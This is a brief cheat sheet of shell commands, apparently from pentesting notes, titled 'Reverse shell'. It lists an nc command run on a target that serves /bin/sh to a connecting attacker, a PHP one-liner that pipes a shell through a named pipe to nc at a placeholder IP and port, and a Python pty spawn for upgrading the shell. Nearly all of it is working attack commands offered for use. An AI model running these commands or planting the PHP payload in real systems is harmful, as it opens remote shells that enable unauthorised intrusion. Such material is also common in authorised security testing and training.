# ↕️ Reverse shell

## nc

Inside the target machine

```bash
nc -lnvvp <port> -e /bin/sh
```

To connect from the attacker machine:

```bash
nc <host> <port>
```

## PHP

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f"); ?>
```

## Python

```py
python3 -c 'import pty; pty.spawn("/bin/sh")'
```